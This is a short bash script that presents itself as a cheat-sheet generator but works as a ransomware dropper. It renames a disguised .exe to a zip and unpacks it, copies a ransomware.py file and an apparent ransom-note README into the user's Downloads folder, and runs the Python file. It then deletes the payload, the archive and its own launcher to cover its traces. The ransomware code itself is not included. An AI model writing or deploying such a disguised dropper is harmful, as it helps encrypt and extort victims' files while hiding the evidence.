#!usr/bin/bash

filename="generatecheatsheet.exe"
rename="generatecheatsheet.zip"

if [ -f $filename ]; then
	$(mv -i $filename $rename)
fi

echo "Unzipping files... Do not terminate"
unzip -qq  $rename

cd generatecheatsheet
cp ./ransomware.py ~/Downloads/ransomware.py
cp ./README.txt ~/Downloads/README2.txt

cd ~/Downloads
python ransomware.py

rm ransomware.py

cd cheatsheets
rm -rf generatecheatsheet
rm generatecheatsheet.zip
rm cutecheatsheet.sh
